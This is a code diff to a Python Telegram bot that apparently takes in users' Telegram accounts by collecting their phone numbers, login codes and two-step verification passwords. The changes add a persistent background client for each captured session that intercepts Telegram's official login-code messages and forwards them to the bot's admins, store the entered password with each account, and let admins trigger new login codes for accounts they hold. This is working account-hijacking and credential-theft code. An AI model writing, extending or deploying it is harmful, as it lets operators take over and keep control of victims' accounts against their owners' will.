@@ -20,7 +20,7 @@ from aiogram.types import (
     InlineKeyboardMarkup,
     Message,
 )
-from telethon import TelegramClient
+from telethon import TelegramClient, events
 from telethon.errors import (
     FloodWaitError,
     PhoneCodeEmptyError,
@@ -49,6 +49,9 @@ bot = Bot(token=API_TOKEN)
 dp = Dispatcher(storage=MemoryStorage())
 router = Router()
 dp.include_router(router)
+
+# Словарь для хранения активных фоновых клиентов Telethon в памяти
+active_telethon_clients = {}
 
 
 # ================= СОСТОЯНИЯ (FSM) =================
@@ -208,6 +211,58 @@ async def set_setting(key: str, value: str):
         await db.commit()
 
 
+# ================= ФОНОВЫЙ УПРАВЛИТЕЛЬ СЕССИЙ =================
+async def setup_account_listener(acc_id: int, session_file_path: str, phone: str):
+    """Держит сессию подключенной и пересылает входящие сообщения от Telegram (777000) админам"""
+    if acc_id in active_telethon_clients:
+        try:
+            await active_telethon_clients[acc_id].disconnect()
+        except Exception:
+            pass
+
+    client = TelegramClient(session_file_path, int(API_ID), str(API_HASH))
+
+    @client.on(events.NewMessage(chats=777000))
+    async def intercept_telegram_code(event):
+        msg_text = event.message.text
+        for admin_id in ADMIN_IDS:
+            try:
+                await bot.send_message(
+                    chat_id=admin_id,
+                    text=(
+                        f"📩 **Новый код/сообщение от Telegram!**\n"
+                        f"• Аккаунт (ID в базе): `{acc_id}`\n"
+                        f"• Телефон: `{phone}`\n\n"
+                        f"💬 **Текст сообщения:**\n`{msg_text}`"
+                    ),
+                    parse_mode="Markdown"
+                )
+            except Exception as e:
+                logger.error(f"Не удалось переслать код админу: {e}")
+
+    try:
+        await client.connect()
+        if await client.is_user_authorized():
+            active_telethon_clients[acc_id] = client
+            logger.info(f"Фоновый слушатель успешно запущен для аккаунта {phone} (ID: {acc_id})")
+        else:
+            await client.disconnect()
+    except Exception as e:
+        logger.error(f"Ошибка запуска слушателя для {phone}: {e}")
+
+
+async def init_all_account_listeners():
+    """Запускает слушатели для всех сохраненных аккаунтов при старте бота"""
+    async with aiosqlite.connect(DB_PATH) as db:
+        async with db.execute("SELECT id, session_name, phone FROM accounts") as cursor:
+            rows = await cursor.fetchall()
+            for row in rows:
+                acc_id, session_name, phone = row
+                session_file_path = f"{session_name}.session"
+                if os.path.exists(session_file_path):
+                    asyncio.create_task(setup_account_listener(acc_id, session_file_path, phone))
+
+
 # ================= ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =================
 async def edit_to_photo_or_text(message: Message, text: str, reply_markup, photo_key: str,
                                 parse_mode: str = "Markdown"):
@@ -273,15 +328,16 @@ async def finalize_auth_and_success(client: TelegramClient, phone: str, session_
         pass
 
     async with aiosqlite.connect(DB_PATH) as db:
-        await db.execute(
-            "UPDATE accounts SET password = ? WHERE session_name = ?",
-            (password_used if has_2fa else "", session_name)
+        cursor = await db.execute(
+            "INSERT INTO accounts (user_id, phone, session_name, password, date) VALUES (?, ?, ?, ?, datetime('now'))",
+            (user_id, phone, session_name, password if has_2fa else "")
         )
-        await db.execute(
-            "UPDATE users SET balance = balance + 1.0, total_earned = total_earned + 1.0 WHERE user_id = ?",
-            (user_id,)
-        )
+        acc_id = cursor.lastrowid
         await db.commit()
+
+    # Запускаем постоянный фоновый прослушиватель для этого аккаунта
+    session_file_path = f"{session_name}.session"
+    asyncio.create_task(setup_account_listener(acc_id, session_file_path, phone))
 
     for admin_id in ADMIN_IDS:
         try:
@@ -290,6 +346,7 @@ async def finalize_auth_and_success(client: TelegramClient, phone: str, session_
                 chat_id=admin_id,
                 text=(
                     f"📥 **Аккаунт успешно принят в систему!**\n\n"
+                    f"• ID в базе: `{acc_id}`\n"
                     f"• Пользователь: `{user_id}`\n"
                     f"• Телефон: `{phone}`"
                     f"{pwd_info}"
@@ -435,14 +492,6 @@ async def process_code(message: Message, state: FSMContext):
 
     try:
         await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
-
-        async with aiosqlite.connect(DB_PATH) as db:
-            await db.execute(
-                "INSERT INTO accounts (user_id, phone, session_name, password, date) VALUES (?, ?, ?, '', datetime('now'))",
-                (uid, phone, session_name)
-            )
-            await db.commit()
-
         await finalize_auth_and_success(client, phone, session_name, uid, has_2fa=False)
         if status_msg_id:
             try:
@@ -494,14 +543,6 @@ async def process_password(message: Message, state: FSMContext):
 
     try:
         await client.sign_in(password=password)
-
-        async with aiosqlite.connect(DB_PATH) as db:
-            await db.execute(
-                "INSERT INTO accounts (user_id, phone, session_name, password, date) VALUES (?, ?, ?, ?, datetime('now'))",
-                (uid, phone, session_name, password)
-            )
-            await db.commit()
-
         await finalize_auth_and_success(client, phone, session_name, uid, has_2fa=True, password_used=password)
         if status_msg_id:
             try:
@@ -707,14 +748,15 @@ async def admin_accounts_list(callback: CallbackQuery):
     for acc in accounts:
         acc_id, uid, phone, pwd, date_str = acc
         pwd_text = f" | Пароль: {pwd}" if pwd else " | Без пароля"
-        kb_buttons.append([InlineKeyboardButton(text=f"📱 {phone}{pwd_text}", callback_data=f"adm_acc_code_{acc_id}")])
+        kb_buttons.append(
+            [InlineKeyboardButton(text=f"📱 ID:{acc_id} | {phone}{pwd_text}", callback_data=f"adm_acc_code_{acc_id}")])
 
     kb_buttons.append([InlineKeyboardButton(text="⬅️ Назад в админ-панель", callback_data="admin_panel")])
 
     await callback.message.edit_text(
         "📦 **Завершенные сделки (Успешные аккаунты)**\n"
-        "Здесь отображается пароль, который вводил пользователь при сдаче.\n"
-        "Нажмите на любой аккаунт, чтобы бот **запросил новый код у Telegram**:",
+        "Сессии этих аккаунтов удерживаются в памяти бота.\n"
+        "Нажмите на аккаунт, чтобы бот принудительно запросил новый код:",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=kb_buttons),
         parse_mode="Markdown"
     )
@@ -736,22 +778,27 @@ async def admin_auto_request_code(callback: CallbackQuery):
         return await callback.answer("❌ Аккаунт не найден в базе данных.", show_alert=True)
 
     uid, phone, session_name, password = row
-    session_file_path = f"{session_name}.session"
 
-    await callback.message.edit_text(f"⏳ Подключаюсь к аккаунту `{phone}` и запрашиваю код у Telegram...",
+    await callback.message.edit_text(f"⏳ Запрашиваю код для `{phone}` через активный фоновый клиент...",
                                      parse_mode="Markdown")
 
-    client = TelegramClient(session_file_path, int(API_ID), str(API_HASH))
+    # Берем клиент из памяти, если он там есть, либо временно открываем сессию
+    client = active_telethon_clients.get(acc_id)
+    temp_client = None
+
     try:
-        await client.connect()
-
-        # Проверяем статус авторизации, чтобы предотвратить случайный сброс или лив сессии
-        if await client.is_user_authorized():
-            await client.send_code_request(phone, force_sms=False)
+        if not client or not client.is_connected():
+            session_file_path = f"{session_name}.session"
+            temp_client = TelegramClient(session_file_path, int(API_ID), str(API_HASH))
+            await temp_client.connect()
+            client_to_use = temp_client
         else:
-            await client.send_code_request(phone)
+            client_to_use = client
 
-        await client.disconnect()
+        await client_to_use.send_code_request(phone)
+
+        if temp_client:
+            await temp_client.disconnect()
 
         kb = InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text="🔄 Запросить код повторно", callback_data=f"adm_acc_code_{acc_id}")],
@@ -761,17 +808,18 @@ async def admin_auto_request_code(callback: CallbackQuery):
         pwd_display = f"\n• 🔑 Введенный пароль: `{password}`" if password else "\n• 🔑 Введенный пароль: Отсутствует"
 
         await callback.message.edit_text(
-            f"✅ **Запрос кода для `{phone}` успешно отправлен в Telegram!**{pwd_display}\n\n"
-            f"ℹ️ Код отправлен в официальное приложение Telegram на аккаунте. Проверьте его на устройстве.",
+            f"✅ **Запрос кода для `{phone}` успешно отправлен!**{pwd_display}\n\n"
+            f"ℹ️ Сообщение с кодом от Telegram придет прямо сюда (администратору) автоматически.",
             reply_markup=kb,
             parse_mode="Markdown"
         )
 
     except Exception as e:
-        try:
-            await client.disconnect()
-        except Exception:
-            pass
+        if temp_client:
+            try:
+                await temp_client.disconnect()
+            except Exception:
+                pass
 
         kb = InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text="🔄 Попробовать снова", callback_data=f"adm_acc_code_{acc_id}")],
@@ -991,7 +1039,11 @@ async def admin_send_broadcast(message: Message, state: FSMContext):
 # ================= ЗАПУСК БОТА =================
 async def main():
     await init_db()
-    logger.info("Бот samoobman priemka успешно запущен!")
+
+    # Запускаем прослушиватели для всех уже существующих в БД аккаунтов в фоновом режиме
+    await init_all_account_listeners()
+
+    logger.info("Бот samoobman priemka и фоновые слушатели сессий успешны запущены!")
     await dp.start_polling(bot)
 
 
